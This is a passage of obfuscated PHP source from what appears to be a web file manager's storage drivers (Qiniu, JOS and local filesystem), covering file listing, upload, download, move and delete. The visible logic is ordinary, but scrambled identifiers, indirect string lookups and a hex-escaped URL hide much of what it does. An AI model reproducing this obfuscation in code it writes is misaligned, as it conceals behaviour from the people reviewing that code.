$ÃÚˆš½[$Úß²Çµ[1535]]; } return $‚ïêÃù‚; } public function folderInfo($Èşñö•ö, $¹¥¿Š…û = false) { $á××ßà =& $_SERVER[¿ğÚ‰±–]; $ÑÑ€ˆÁû = array($á××ßà[32] => $this->pathThis($Èşñö•ö), $á××ßà[87] => $this->getPathOuter($á××ßà[8] . $Èşñö•ö), $á××ßà[33] => $á××ßà[78]); if ($¹¥¿Š…û) { return $ÑÑ€ˆÁû; } $ÑÑ€ˆÁû[$á××ßà[231]] = $ÑÑ€ˆÁû[$á××ßà[88]] = 0; $ÑÑ€ˆÁû[$á××ßà[232]] = $ÑÑ€ˆÁû[$á××ßà[233]] = !0; $Èşñö•ö = rtrim($Èşñö•ö, $á××ßà[8]) . $á××ßà[8]; $§Êû”Æù = $this->objectMeta($Èşñö•ö); if (isset($§Êû”Æù[$á××ßà[1536]])) { $ÑÑ€ˆÁû[$á××ßà[88]] = substr($§Êû”Æù[$á××ßà[1536]] . $á××ßà[12], 0, 10); } return $ÑÑ€ˆÁû; } public function listPath($ØÎ¶§, $ØÔ’§ı“ = false) { $´™üŒ¯¡ =& $_SERVER[¿ğÚ‰±–]; $ˆÏüø©ä = $this->fileList($ØÎ¶§, $´™üŒ¯¡[8], !0); foreach ($ˆÏüø©ä[$´™üŒ¯¡[85]] as $ÏÇ•ƒğ => $–À¿¢•) { $ˆÏüø©ä[$´™üŒ¯¡[85]][$ÏÇ•ƒğ] = $this->folderInfo($–À¿¢•, $ØÔ’§ı“); } foreach ($ˆÏüø©ä[$´™üŒ¯¡[86]] as $ÏÇ•ƒğ => $–À¿¢•) { $ˆÏüø©ä[$´™üŒ¯¡[86]][$ÏÇ•ƒğ] = $this->fileInfo($–À¿¢•[$´™üŒ¯¡[97]], $ØÔ’§ı“, $–À¿¢•); } return $ˆÏüø©ä; } public function has($†ÑãóÜØ, $®æê©í = false, $É´ç¸“ = true) { $Ä«õ¯ç§ =& $_SERVER[¿ğÚ‰±–]; $†ÑãóÜØ = trim($†ÑãóÜØ, $Ä«õ¯ç§[8]); $¼ÏÒ‰Ûë = empty($†ÑãóÜØ) && $†ÑãóÜØ !== $Ä«õ¯ç§[228] ? $Ä«õ¯ç§[12] : $†ÑãóÜØ . $Ä«õ¯ç§[8]; $æã¤ä‰Î = $Ä«õ¯ç§[12]; $ëËÑ¿Ú = 500; $¾àØğó¥ = $Ä«õ¯ç§[8]; $Öú§ÄÙ = $ÚİËä™¶ = 0; while (!0) { check_abort(); list($ºëßŒßå, $ú€“–Ø) = $this->bucketManager->listFiles($this->bucket, $¼ÏÒ‰Ûë, $æã¤ä‰Î, $ëËÑ¿Ú, $¾àØğó¥); if ($ú€“–Ø) { break; } $æã¤ä‰Î = array_key_exists($Ä«õ¯ç§[1481], $ºëßŒßå) ? $æã¤ä‰Î = $ºëßŒßå[$Ä«õ¯ç§[1537]] : $Ä«õ¯ç§[12]; if ($®æê©í) { if (!empty($ºëßŒßå[$Ä«õ¯ç§[1538]])) { $Öú§ÄÙ += count($ºëßŒßå[$Ä«õ¯ç§[1538]]); } if (!empty($ºëßŒßå[$Ä«õ¯ç§[1539]])) { $ÚİËä™¶ += count($ºëßŒßå[$Ä«õ¯ç§[1539]]); } if ($æã¤ä‰Î === $Ä«õ¯ç§[12]) { break; } continue; } if ($É´ç¸“) { if (!empty($ºëßŒßå[$Ä«õ¯ç§[1538]])) { return !0; } } else { if (!empty($ºëßŒßå[$Ä«õ¯ç§[1539]])) { return !0; } } if ($æã¤ä‰Î === $Ä«õ¯ç§[12]) { break; } } if ($®æê©í) { return array($Ä«õ¯ç§[239] => $Öú§ÄÙ, $Ä«õ¯ç§[240] => $ÚİËä™¶); } return !1; } public function listAll($¿ÙÖòâ) { $£š‚«€À =& $_SERVER[¿ğÚ‰±–]; $§¯å¡Š¥ = $this->fileList($¿ÙÖòâ, $£š‚«€À[12], !0); $…ÊÂ´ = array_to_keyvalue($§¯å¡Š¥[$£š‚«€À[86]], $£š‚«€À[32]); foreach ($§¯å¡Š¥[$£š‚«€À[85]] as $™ê¬§£‚) { if (is_string($™ê¬§£‚)) { $…ÊÂ´[$™ê¬§£‚] = array($£š‚«€À[79] => 0); } } return $this->listAllFiles($¿ÙÖòâ, $…ÊÂ´); } private function fileList($õÄ°‰éÕ, $Á²é±‘£ = '', $Í¤Ú·³– = 0) { $‚ŞŠè¿ñ =& $_SERVER[¿ğÚ‰±–]; $õÄ°‰éÕ = trim($õÄ°‰éÕ, $‚ŞŠè¿ñ[8]); $¸‘¶Ø‚ï = empty($õÄ°‰éÕ) && $õÄ°‰éÕ !== $‚ŞŠè¿ñ[228] ? $‚ŞŠè¿ñ[12] : $õÄ°‰éÕ . $‚ŞŠè¿ñ[8]; $ªÊù±¨¼ = $‚ŞŠè¿ñ[12]; $Œ“ÉÉË‡ = 1000; $¤ô±Ùı‰ = $÷ğ†×Í = array(); while (!0) { check_abort(); list($“€úÊì¥, $ŠŸÛ¶ª—) = $this->bucketManager->listFiles($this->bucket, $¸‘¶Ø‚ï, $ªÊù±¨¼, $Œ“ÉÉË‡, $Á²é±‘£); if ($ŠŸÛ¶ª—) { break; } $ªÊù±¨¼ = array_key_exists($‚ŞŠè¿ñ[1481], $“€úÊì¥) ? $ªÊù±¨¼ = $“€úÊì¥[$‚ŞŠè¿ñ[1537]] : $‚ŞŠè¿ñ[12]; $±ô“”Ç = isset($“€úÊì¥[$‚ŞŠè¿ñ[1538]]) ? $“€úÊì¥[$‚ŞŠè¿ñ[1538]] : array(); $¡Ï¡Óš = isset($“€úÊì¥[$‚ŞŠè¿ñ[1539]]) ? $“€úÊì¥[$‚ŞŠè¿ñ[1539]] : array(); foreach ($±ô“”Ç as $¶óıºæ) { if ($¶óıºæ[$‚ŞŠè¿ñ[97]] == $¸‘¶Ø‚ï) { continue; } $ÒìÄÁÅ¥ = $¶óıºæ[$‚ŞŠè¿ñ[97]]; $Š™ÎİñÁ = $¶óıºæ[$‚ŞŠè¿ñ[1535]]; $¶óıºæ[$‚ŞŠè¿ñ[79]] = $Š™ÎİñÁ; $Âƒªøæ“ = $Š™ÎİñÁ == 0 && substr($ÒìÄÁÅ¥, strlen($ÒìÄÁÅ¥) - 1, 1) == $‚ŞŠè¿ñ[8] ? !0 : !1; $this->cacheMethodInfoSet($ÒìÄÁÅ¥, $Âƒªøæ“, $¶óıºæ); if ($Âƒªøæ“) { $¤ô±Ùı‰[] = $ÒìÄÁÅ¥; continue; } $÷ğ†×Í[] = $Í¤Ú·³– ? $¶óıºæ : $ÒìÄÁÅ¥; } foreach ($¡Ï¡Óš as $ÒìÄÁÅ¥) { if ($ÒìÄÁÅ¥ == $¸‘¶Ø‚ï) { continue; } $¤ô±Ùı‰[] = $ÒìÄÁÅ¥; $this->cacheMethodInfoSet($ÒìÄÁÅ¥, !0); } if ($ªÊù±¨¼ === $‚ŞŠè¿ñ[12]) { break; } } $this->cacheMethodInfoSet($õÄ°‰éÕ, !0); return array($‚ŞŠè¿ñ[85] => $¤ô±Ùı‰, $‚ŞŠè¿ñ[86] => $÷ğ†×Í); } public function canRead($¿ÅÜ½’ó) { return $this->exist($¿ÅÜ½’ó) ? !0 : !1; } public function canWrite($È‡ñÒœ») { return $this->exist($È‡ñÒœ») ? !0 : !1; } public function getContent($‡¸¦Ğğè) { return $this->fileSubstr($‡¸¦Ğğè, 0, -1); } public function setContent($÷Ó€Œµî, $‡Ãùß³Ô = '') { $†˜òï©ü = $this->tempFile($this->pathThis($÷Ó€Œµî)); file_put_contents($†˜òï©ü, $‡Ãùß³Ô); if ($this->upload($÷Ó€Œµî, $†˜òï©ü)) { $this->tempFileRemve($†˜òï©ü); return !0; } return !1; } public function refreshUrls($˜×Õ‹‰â) { $‰‡‰¢Ô =& $_SERVER[¿ğÚ‰±–]; $ù¹¥Û¾û = array(); if (is_array($˜×Õ‹‰â)) { foreach ($˜×Õ‹‰â as $æúğÑÓÓ) { $ù¹¥Û¾û[] = $this->link($æúğÑÓÓ); } } else { $ù¹¥Û¾û[] = $this->link($˜×Õ‹‰â); } $—‰è‡ş¤ = new Qiniu\Cdn\CdnManager($this->auth); list($ŒÕÅ‚œ², $½»Öªì—) = $—‰è‡ş¤->refreshUrls($ù¹¥Û¾û); if ($½»Öªì—) { return !1; } return $ŒÕÅ‚œ²[$‰‡‰¢Ô[1271]] == $‰‡‰¢Ô[837] ? !0 : !1; } public function fileSubstr($˜”şöáÙ, $¥êÈÁ¼´, $¾Õë••õ) { $‚šçÛ¶ß =& $_SERVER[¿ğÚ‰±–]; if (!($îåºÈ³¯ = $this->link($˜”şöáÙ))) { return !1; } $³áËå¹ı = !1; if ($¾Õë••õ > 0) { $ÂŞåÜÏÚ = $¥êÈÁ¼´ + $¾Õë••õ - 1; $³áËå¹ı = array($‚šçÛ¶ß[1540] . $¥êÈÁ¼´ . $‚šçÛ¶ß[462] . $ÂŞåÜÏÚ); } $ê“š­ô… = url_request($îåºÈ³¯, $‚šçÛ¶ß[261], !1, $³áËå¹ı); return $ê“š­ô…[$‚šçÛ¶ß[828]] ? $ê“š­ô…[$‚šçÛ¶ß[1294]] : !1; } public function upload($Æé½‹®µ, $¿å•õÖ§, $Ø¼«‘‹ = false, $ÔøµÀ›« = REPEAT_REPLACE) { $äôº™õ = new Qiniu\Storage\UploadManager(); $ÎÅàÔŒù = $this->auth->uploadToken($this->bucket, $Æé½‹®µ); $öÁÅÂ„ö = get_file_mime(get_path_ext($¿å•õÖ§)); list($Ğˆ±µ¶‰, $˜·ë­ºù) = $äôº™õ->putFile($ÎÅàÔŒù, $Æé½‹®µ, $¿å•õÖ§, null, $öÁÅÂ„ö); return $˜·ë­ºù ? !1 : $this->getPathOuter($Æé½‹®µ); } public function uploadFormData($À‘¸¨—÷, $ïîÄŠØ’ = 3600) { return $this->uploadToken($À‘¸¨—÷, $ïîÄŠØ’); } public function multiUploadFormData($ìô‰œß‚, $ÁÇ©¢¿° = 3600) { return $this->uploadToken($ìô‰œß‚, $ÁÇ©¢¿°); } private function uploadToken($¯ÉÎ“çè, $îÑ„–¼é = 3600) { $İÌ·Û½ä =& $_SERVER[¿ğÚ‰±–]; $Ğè»ŸŠ­ = $îÑ„–¼é; $Å¯÷ÉÁ– = array($İÌ·Û½ä[1541] => $İÌ·Û½ä[1542]); $Ôë½“ÇÆ = $¯ÉÎ“çè; $¬Üµ¬Å³ = $this->auth->uploadToken($this->bucket, $Ôë½“ÇÆ, $Ğè»ŸŠ­, $Å¯÷ÉÁ–, !0); $¶Ì•Šô = empty($this->region) || $this->region == $İÌ·Û½ä[1543] ? $İÌ·Û½ä[12] : $İÌ·Û½ä[462] . $this->region; $êÇˆóê = http_type() . "\x3a\x2f\x2f\165\x70\154\x6f\141\144{$¶Ì•Šô}\x2e\161\x69\156\151\x75\x70\56\x63\x6f\155\x2f"; return array($İÌ·Û½ä[1544] => $¬Üµ¬Å³, $İÌ·Û½ä[1545] => $êÇˆóê); } public function download($à¬æ¯…¾, $İšğÀ¿ä) { $É÷Õ»ó = IO::getPathInner(IO::mkfile($İšğÀ¿ä)); if (!($ï““¹Ğ  = $this->link($à¬æ¯…¾))) { return !1; } $€Áªûùõ = 0; $Ô´ÊÍı = 1024 * 200; $ª²µÀçé = fopen($É÷Õ»ó, $_SERVER[¿ğÚ‰±–][1546]); while (!0) { $ª³…Å¿ = $this->fileSubstr($à¬æ¯…¾, $€Áªûùõ, $Ô´ÊÍı); if ($ª³…Å¿ === !1) { return !1; } fwrite($ª²µÀçé, $ª³…Å¿); $€Áªûùõ += $Ô´ÊÍı; if (strlen($ª³…Å¿) < $Ô´ÊÍı) { break; } } fclose($ª²µÀçé); return $İšğÀ¿ä; } public function link($ŠÑ±éÊ, $¼É÷şÚ… = '') { if (!$this->isFile($ŠÑ±éÊ)) { return !1; } $¼ºñ€– = $this->getHost() . $_SERVER[¿ğÚ‰±–][8] . $this->pathEncode($ŠÑ±éÊ) . $¼É÷şÚ…; return $this->auth->privateDownloadUrl($¼ºñ€–, 3600 * 12); } public function fileOut($åšÉ±¿, $­èÏÉ¼Š = false, $³Î¦”üš = false, $ÃòŠ‘Í = '') { $ºÜõÎ¯˜ =& $_SERVER[¿ğÚ‰±–]; if ($this->isFileOutServer()) { return $this->fileOutServer($åšÉ±¿, $­èÏÉ¼Š, $³Î¦”üš, $ÃòŠ‘Í); } if (!$³Î¦”üš) { $³Î¦”üš = $this->pathThis($åšÉ±¿); } $Àâ×Öş = $­èÏÉ¼Š ? $ºÜõÎ¯˜[1547] . rawurlencode($³Î¦”üš) : $ºÜõÎ¯˜[12]; $—ßè»† = $this->link($åšÉ±¿, $Àâ×Öş); $this->fileOutLink($—ßè»†); } public function fileOutServer($»µô‘Å, $¾èø = false, $üØû¿¦Ï = false, $Êõœ‘â™ = '') { parent::fileOut($»µô‘Å, $¾èø, $üØû¿¦Ï, $Êõœ‘â™); } public function fileOutImage($Ùç½€‘Î, $û¡ÌÔ–š = 250) { if ($this->size($Ùç½€‘Î) > 1024 * 1024 * 20) { return $this->fileOutImageServer($Ùç½€‘Î, $û¡ÌÔ–š); } $ ¼ÚºÃã = $this->link($Ùç½€‘Î, $_SERVER[¿ğÚ‰±–][1548] . $û¡ÌÔ–š); $this->fileOutLink($ ¼ÚºÃã); } public function fileOutImageServer($‘Èü€€, $­Ç‡ÂÓ‡ = 250) { parent::fileOutImage($‘Èü€€, $­Ç‡ÂÓ‡); } public function hashMd5($™şû¤×ë) { $§¨ø©Şä =& $_SERVER[¿ğÚ‰±–]; $õ¨±Ûìä = $this->objectMeta($™şû¤×ë); return isset($õ¨±Ûìä[$§¨ø©Şä[245]]) ? $õ¨±Ûìä[$§¨ø©Şä[245]] : !1; $ùíöÉŠ = $this->link($™şû¤×ë, $§¨ø©Şä[1549]); } public function size($À¦û×Ñ) { $…³÷Øöë = $this->objectMeta($À¦û×Ñ); return $…³÷Øöë ? $…³÷Øöë[$_SERVER[¿ğÚ‰±–][79]] : 0; } public function info($Œ™íÔå) { if ($this->isFolder($Œ™íÔå)) { return $this->folderInfo($Œ™íÔå); } else { if ($this->isFile($Œ™íÔå)) { return $this->fileInfo($Œ™íÔå); } } return !1; } public function exist($´ÈòÓ) { return $this->isFile($´ÈòÓ) || $this->isFolder($´ÈòÓ); } public function isFile($–´…Ãä) { return !$this->isFolder($–´…Ãä) && $this->objectMeta($–´…Ãä); } public function isFolder($£ÎŒğÕ‘) { return $this->cacheMethod($_SERVER[¿ğÚ‰±–][179], $£ÎŒğÕ‘); } protected function objectMeta($Ê’û„Ê¸) { return $this->cacheMethod($_SERVER[¿ğÚ‰±–][181], $Ê’û„Ê¸); } protected function _objectMeta($ÏêŒÓ´¨) { $Ê©ò½— =& $_SERVER[¿ğÚ‰±–]; list($êÔ½åÈ, $ˆ–ŞÉ‘Š) = $this->bucketManager->stat($this->bucket, $ÏêŒÓ´¨); if ($êÔ½åÈ) { $êÔ½åÈ[$Ê©ò½—[79]] = intval($êÔ½åÈ[$Ê©ò½—[1535]]); } return $êÔ½åÈ; } protected function _isFolder($•–ìùı•) { $±Ø¸àğÜ =& $_SERVER[¿ğÚ‰±–]; if ($•–ìùı• == $±Ø¸àğÜ[12] || $•–ìùı• == $±Ø¸àğÜ[8]) { return !0; } list($§ßãŸ·¦, $¿Í¸—ßì) = $this->bucketManager->listFiles($this->bucket, trim($•–ìùı•, $±Ø¸àğÜ[8]) . $±Ø¸àğÜ[8], $±Ø¸àğÜ[12], 1, $±Ø¸àğÜ[8]); return !empty($§ßãŸ·¦[$±Ø¸àğÜ[1538]]) || !empty($§ßãŸ·¦[$±Ø¸àğÜ[1539]]) ? !0 : !1; } } goto F„½ÕŒÜ²Ì; Fã†ºÀô®Ñ: class PathDriverJOS extends PathDriverBaseS3 { public function __construct($â†º°) { parent::__construct($â†º°); $this->setSignVersion($_SERVER[¿ğÚ‰±–][247]); } public function uploadLink($ã°¿”µ², $ ¦á¯ÍÁ = 0) { $½Éøê´® =& $_SERVER[¿ğÚ‰±–]; if ($this->isUploadServer()) { return; } $¿Ş¾°øÆ = $this->getType(); if (!in_array($¿Ş¾°øÆ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $—Ğ‰ ’ = (!$ ¦á¯ÍÁ ? 1 : ceil($ ¦á¯ÍÁ / pow(1024, 3))) * 3600 * 4; $óí¶ƒÁ = $this->multiUploadFormData($ã°¿”µ², $—Ğ‰ ’); if ($óí¶ƒÁ) { $óí¶ƒÁ[$½Éøê´®[97]] = $ã°¿”µ²; $óí¶ƒÁ[$½Éøê´®[98]] = $¿Ş¾°øÆ; } return $óí¶ƒÁ; } public function fileOutImage($äŒ±ÂÅø, $âú˜«˜é = 250) { if ($this->size($äŒ±ÂÅø) > 1024 * 1024 * 25) { return $this->fileOutImageServer($äŒ±ÂÅø, $âú˜«˜é); } $«ï›ñ‘ = $this->link($äŒ±ÂÅø); $«ï›ñ‘ .= $_SERVER[¿ğÚ‰±–][1458] . $âú˜«˜é; $this->fileOutLink($«ï›ñ‘); } public function fileOutLink($†ÖŸÒîä) { $èÏÔåë“ =& $_SERVER[¿ğÚ‰±–]; if (substr($†ÖŸÒîä, 0, 7) == $èÏÔåë“[313]) { $†ÖŸÒîä = $èÏÔåë“[314] . substr($†ÖŸÒîä, 7); } header($èÏÔåë“[175] . $†ÖŸÒîä); die; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($—Û“ëú€) { if (substr($—Û“ëú€, 0, 2) == $_SERVER[¿ğÚ‰±–][1417]) { $—Û“ëú€ = BASIC_PATH . substr($—Û“ëú€, 2); } return $—Û“ëú€; } public function iconvApp($ó³¢ñ­Á) { $˜¸¤ˆµÚ =& $_SERVER[¿ğÚ‰±–]; global $config; return $this->iconvTo($ó³¢ñ­Á, $config[$˜¸¤ˆµÚ[1444]], $config[$˜¸¤ˆµÚ[1443]]); } public function iconvSystem($†·ê¹µÊ) { $Ú¨œ¯ƒ =& $_SERVER[¿ğÚ‰±–]; global $config; return $this->iconvTo($†·ê¹µÊ, $config[$Ú¨œ¯ƒ[1443]], $config[$Ú¨œ¯ƒ[1444]]); } public function getPathOuter($šóæâî×) { $¦ºˆÕ¶„ =& $_SERVER[¿ğÚ‰±–]; $ËÆœ¢ä˜ = $this->iconvApp($this->pathBase); $šóæâî× = $this->iconvApp($šóæâî×); if (substr($ËÆœ¢ä˜, 0, 2) == $¦ºˆÕ¶„[1417]) { $ËÆœ¢ä˜ = BASIC_PATH . substr($ËÆœ¢ä˜, 2); } if (substr($šóæâî×, 0, 2) == $¦ºˆÕ¶„[1417]) { $šóæâî× = BASIC_PATH . substr($šóæâî×, 2); } $ËÆœ¢ä˜ = KodIO::clear($ËÆœ¢ä˜); $šóæâî× = KodIO::clear($šóæâî×); $šóæâî× = substr($šóæâî×, strlen($ËÆœ¢ä˜)); if (empty($this->pathDriver)) { return $šóæâî×; } return $this->pathDriver . $¦ºˆÕ¶„[8] . ltrim($šóæâî×, $¦ºˆÕ¶„[8]); } public function mkfile($…Œõı©, $Òİí¡ğ = '', $»¬¾¡ÀÖ = REPEAT_RENAME) { $…Œõı© = $this->iconvSystem($…Œõı©); @touch($…Œõı©); if ($Òİí¡ğ) { file_put_contents($…Œõı©, $Òİí¡ğ); } @chmod($…Œõı©, $this->pathAuth); if (is_file($…Œõı©)) { return $this->getPathOuter($…Œõı©); } $this->writeLog(__FUNCTION__ . $_SERVER[¿ğÚ‰±–][1455], !0); return !1; } public function mkdir($Û™»ó, $ğéª¥¸ğ = REPEAT_SKIP) { $Û™»ó = $this->iconvSystem($Û™»ó); if (is_dir($Û™»ó)) { return $this->getPathOuter($Û™»ó); } @mkdir($Û™»ó, $this->pathAuth, !0); @chmod($Û™»ó, $this->pathAuth); if (is_dir($Û™»ó)) { return $this->getPathOuter($Û™»ó); } $this->writeLog(__FUNCTION__ . $_SERVER[¿ğÚ‰±–][1455], !0); return !1; } public function copyFile($á±Í¯‡º, $°Ğ‹Ø¨ò) { $this->mkdir($this->pathFather($°Ğ‹Ø¨ò)); $á±Í¯‡º = $this->iconvSystem($á±Í¯‡º); $°Ğ‹Ø¨ò = $this->iconvSystem($°Ğ‹Ø¨ò); $Øè°’‡ = copy_64($á±Í¯‡º, $°Ğ‹Ø¨ò); @chmod($°Ğ‹Ø¨ò, $this->pathAuth); if ($Øè°’‡) { return $this->getPathOuter($°Ğ‹Ø¨ò); } $this->writeLog(__FUNCTION__ . $_SERVER[¿ğÚ‰±–][1455], !0); return !1; } public function moveFile($–ø­ò¯, $àè¯é¯½) { $this->mkdir($this->pathFather($àè¯é¯½)); $–ø­ò¯ = $this->iconvSystem($–ø­ò¯); $àè¯é¯½ = $this->iconvSystem($àè¯é¯½); $ïÒæ³ûı = intval(@rename($–ø­ò¯, $àè¯é¯½)); if (!$ïÒæ³ûı) { if ($ïÒæ³ûı = intval(@copy_64($–ø­ò¯, $àè¯é¯½))) { @unlink($–ø­ò¯); } } @chmod($àè¯é¯½, $this->pathAuth); if ($ïÒæ³ûı) { return $this->getPathOuter($àè¯é¯½); } $this->writeLog(__FUNCTION__ . $_SERVER[¿ğÚ‰±–][1455], !0); return !1; } public function movePath($‡®†³Èû, $š†À÷Ù³, $˜ïÒ¬ç­ = false) { $ÆÒî–– =& $_SERVER[¿ğÚ‰±–]; $‡®†³Èû = $this->iconvSystem($‡®†³Èû); $š†À÷Ù³ = $this->iconvSystem($š†À÷Ù³); $»¸ĞñÀ = rtrim($š†À÷Ù³, $ÆÒî––[8]) . $ÆÒî––[8] . ($˜ïÒ¬ç­ ? $˜ïÒ¬ç­ : get_path_this($‡®†³Èû)); if (file_exists($»¸ĞñÀ)) { return !1; } $Ü’ÄÈê„ = intval(@rename($‡®†³Èû, $»¸ĞñÀ)); $Ü’ÄÈê„ = file_exists($»¸ĞñÀ); if ($Ü’ÄÈê„) { return $this->getPathOuter($»¸ĞñÀ); } $this->writeLog(__FUNCTION__ . $ÆÒî––[1455], !0); return !1; } public function delFile($Ú½ç·±¥) { $Ú½ç·±¥ = $this->iconvSystem($Ú½ç·±¥); if (!@unlink($Ú½ç·±¥)) { @chmod($Ú½ç·±¥, $this->pathAuth); if (@unlink($Ú½ç·±¥)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[¿ğÚ‰±–][1455], !0); return !1; } return !0; } public function delFolder($‘Á™ÎŒ) { $°…È«ÜÙ =& $_SERVER[¿ğÚ‰±–]; $‘Á™ÎŒ = $this->iconvSystem($‘Á™ÎŒ); if (!is_dir($‘Á™ÎŒ)) { return !0; } if (!($•ŠŞİº¿ = opendir($‘Á™ÎŒ))) { return !1; } while (($ß³¬³ıš = readdir($•ŠŞİº¿)) !== !1) { if ($ß³¬³ıš == $°…È«ÜÙ[10] || $ß³¬³ıš == $°…È«ÜÙ[1370]) { continue; } $Ÿ„İã¬û = $‘Á™ÎŒ . $°…È«ÜÙ[8] . $ß³¬³ıš; if (is_file($Ÿ„İã¬û) || is_link($Ÿ„İã¬û)) { if (!unlink($Ÿ„İã¬û)) { chmod($Ÿ„İã¬û, $this->pathAuth); if (!unlink($Ÿ„İã¬û)) { return !1; } } } else { if (is_dir($Ÿ„İã¬û)) { chmod($Ÿ„İã¬û, $this->pathAuth); $Ÿ„İã¬û = $this->iconvApp($Ÿ„İã¬û); if (!$this->delFolder($Ÿ„İã¬û)) { return !1; } } } } closedir($•ŠŞİº¿); return rmdir($‘Á™ÎŒ); } public function rename($ ÃÜ¿›¤, $¢ôã½áå) { $¨Úâ‡¡ =& $_SERVER[¿ğÚ‰±–]; $šƒê = $this->fileNameAuto($this->pathFather($ ÃÜ¿›¤), $¢ôã½áå); $šƒê = $this->iconvSystem($šƒê); $ ÃÜ¿›¤ = $this->iconvSystem($ ÃÜ¿›¤); $ ®šñ = $this->pathFather($ ÃÜ¿›¤); $ßÆïµß‡ = rtrim($ ®šñ, $¨Úâ‡¡[8]) . $¨Úâ‡¡[8] . $šƒê; $ÆÊ¶ÙÈ = @rename($ ÃÜ¿›¤, $ßÆïµß‡); $ßÆïµß‡ = $this->iconvApp($ßÆïµß‡); if ($ÆÊ¶ÙÈ) { return $this->getPathOuter($ßÆïµß‡); } $this->writeLog(__FUNCTION__ . $¨Úâ‡¡[1455], !0); return !1; } public function size($‰§¦ğ) { $‰§¦ğ = $this->iconvSystem($‰§¦ğ); return filesize_64($‰§¦ğ); } public function info($™°²‹Ğ´) { $™°²‹Ğ´ = $this->iconvSystem($™°²‹Ğ´); if ($this->isFolder($™°²‹Ğ´)) { return $this->folderInfo($™°²‹Ğ´); } else { if ($this->isFile($™°²‹Ğ´)) { return $this->fileInfo($™°²‹Ğ´); } } return !1; } protected function infoChildren($ÆÊáĞĞ”, &$ıÚ²—“§, $ê°ï„Ã = true) { $åµáüë³ =& $_SERVER[¿ğÚ‰±–]; check_abort_echo(); $ÆÊáĞĞ” = rtrim($ÆÊáĞĞ”, $åµáüë³[8]) . $åµáüë³[8]; if ($ê°ï„Ã) { $ÆÊáĞĞ” = $this->iconvSystem($ÆÊáĞĞ”); } if (!($†Õ¨°›Á = @opendir($ÆÊáĞĞ”))) { return; } while (($Áî…Ëğ = readdir($†Õ¨°›Á)) !== !1) { if ($Áî…Ëğ == $åµáüë³[10] || $Áî…Ëğ == $åµáüë³[1370]) { continue; } $×¨’ƒ· = $ÆÊáĞĞ” . $Áî…Ëğ; if (is_file($×¨’ƒ·) || is_link($×¨’ƒ·)) { $ıÚ²—“§[$åµáüë³[80]]++; $ıÚ²—“§[$åµáüë³[79]] += filesize_64($×¨’ƒ·); } else { if (is_dir($×¨’ƒ·)) { $ıÚ²—“§[$åµáüë³[81]]++; $this->infoChildren($×¨’ƒ·, $ıÚ²—“§, !1); } } } closedir($†Õ¨°›Á); } private function folderInfo($Ñšó ÈÇ, $÷§¯ãš¤ = false) { $Óİ¢Ğ»Ó =& $_SERVER[¿ğÚ‰±–]; $Ñšó ÈÇ = rtrim($Ñšó ÈÇ, $Óİ¢Ğ»Ó[8]) . $Óİ¢Ğ»Ó[8]; $÷óĞß¸À = $this->iconvApp($this->pathThis($Ñšó ÈÇ)); if ($÷§¯ãš¤) { return array($Óİ¢Ğ»Ó[32] => $÷óĞß¸À, $Óİ¢Ğ»Ó[87] => $this->getPathOuter($Ñšó ÈÇ), $Óİ¢Ğ»Ó[33] => $Óİ¢Ğ»Ó[78]); } $Íç¯‚«Ú = array($Óİ¢Ğ»Ó[32] => $÷óĞß¸À, $Óİ¢Ğ»Ó[87] => $this->getPathOuter($Ñšó ÈÇ), $Óİ¢Ğ»Ó[33] => $Óİ¢Ğ»Ó[78], $Óİ¢Ğ»Ó[231] => @filectime($Ñšó ÈÇ), $Óİ¢Ğ»Ó[88] => @filemtime($Ñšó ÈÇ), $Óİ¢Ğ»Ó[1459] => @fileatime($Ñšó ÈÇ), $Óİ¢Ğ»Ó[1460] => is_readable($Ñšó ÈÇ), $Óİ¢Ğ»Ó[1461] => is_writable($Ñšó ÈÇ), $Óİ¢Ğ»Ó[1462] => get_mode($Ñšó ÈÇ)); return $Íç¯‚«Ú; } private function fileInfo($éªØéõ­, $ëõòÑ·ñ = false) { $çæ›«š =& $_SERVER[¿ğÚ‰±–]; $¥ÌÕéáÛ = $this->iconvApp($this->pathThis($éªØéõ­)); if ($ëõòÑ·ñ) { return array($çæ›«š[32] => $¥ÌÕéáÛ, $çæ›«š[87] => $this->getPathOuter($éªØéõ­), $çæ›«š[33] => $çæ›«š[230], $çæ›«š[79] => $this->size($éªØéõ­), $çæ›«š[169] => $this->ext($¥ÌÕéáÛ)); } $«½º… = array($çæ›«š[32] => $¥ÌÕéáÛ, $çæ›«š[87] => $this->getPathOuter($éªØéõ­), $çæ›«š[33] => $çæ›«š[230], $çæ›«š[231] => @filectime($éªØéõ­), $çæ›«š[88] => @filemtime($éªØéõ­), $çæ›«š[1459] => @fileatime($éªØéõ­), $çæ›«š[79] => $this->size($éªØéõ­), $çæ›«š[169] => $this->ext($¥ÌÕéáÛ), $çæ›«š[1460] => is_readable($éªØéõ­), $çæ›«š[1461] => is_writable($éªØéõ­), $çæ›«š[1462] => get_mode($éªØéõ­)); return $«½º…; } public function exist($‡ˆ¨ïì®) { $‡ˆ¨ïì® = $this->iconvSystem($‡ˆ¨ïì®); return @file_exists($‡ˆ¨ïì®); } public function isFile($¼ÓÜè¬ë) { $¼ÓÜè¬ë = $this->iconvSystem($¼ÓÜè¬ë); return @is_file($¼ÓÜè¬ë); } public function isFolder($êÍàÙ÷×) { $êÍàÙ÷× = $this->iconvSystem($êÍàÙ÷×); return @is_dir($êÍàÙ÷×); } public function listPath($çŸÅêà, $ôïîíí = false) { $ğ†ô¼ÚÚ =& $_SERVER[¿ğÚ‰±–]; $çŸÅêà = $this->iconvSystem($çŸÅêà); $çŸÅêà = rtrim($çŸÅêà, $ğ†ô¼ÚÚ[8]) . $ğ†ô¼ÚÚ[8]; $µ½÷€õ = array($ğ†ô¼ÚÚ[85] => array(), $ğ†ô¼ÚÚ[86] => array()); if (!($‡·Ç¡î = @opendir($çŸÅêà))) { return $µ½÷€õ; } while (($å†‹†‚ = readdir($‡·Ç¡î)) !== !1) { if ($å†‹†‚ == $ğ†ô¼ÚÚ[10] || $å†‹†‚ == $ğ†ô¼ÚÚ[1370]) { continue; } $Ú¯ÂûØÂ = $çŸÅêà . $å†‹†‚; if (is_file($Ú¯ÂûØÂ)) { $µ½÷€õ[$ğ†ô¼ÚÚ[86]][] = $this->fileInfo($Ú¯ÂûØÂ, $ôïîíí); } else { $µ½÷€õ[$ğ†ô¼ÚÚ[85]][] = 